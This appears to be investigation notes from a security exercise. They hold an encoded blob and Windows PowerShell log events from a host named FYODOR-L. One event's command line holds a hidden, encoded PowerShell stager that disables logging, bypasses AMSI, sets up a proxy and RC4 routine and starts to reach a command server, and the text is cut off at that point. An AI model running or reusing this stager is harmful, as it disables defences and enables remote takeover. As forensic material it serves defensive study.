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

ScriptBlock ID: a600b16e-b0fe-4e96-8826-70640e0e5d28
Path:
Collapse

    host = ABUNGST-L
    source = WinEventLog:Microsoft-Windows-PowerShell/Operational
    sourcetype = wineventlog

Gzip (cyberchef)

08/19/2018 22:45:03 PM
LogName=Microsoft-Windows-PowerShell/Operational
SourceName=Microsoft-Windows-PowerShell
EventCode=4100
EventType=3
Type=Warning
ComputerName=FYODOR-L.froth.ly
User=NOT_TRANSLATED
Sid=S-1-12-1-414122663-1107920193-174118301-2815976889
SidType=0
TaskCategory=Executing Pipeline
OpCode=To be used when an exception is raised
RecordNumber=302
Keywords=None
Message=Error Message = At line:1 char:58
+ wget http://192.168.9.30:8080" -outfile "192.168.9.30.txt"
+                                                          ~
The string is missing the terminator: ".
Fully Qualified Error ID = TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand


Context:
        Severity = Warning
        Host Name = ConsoleHost
        Host Version = 5.1.17134.112
        Host ID = 15a94145-5d37-4814-88d9-820a3462592b
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEE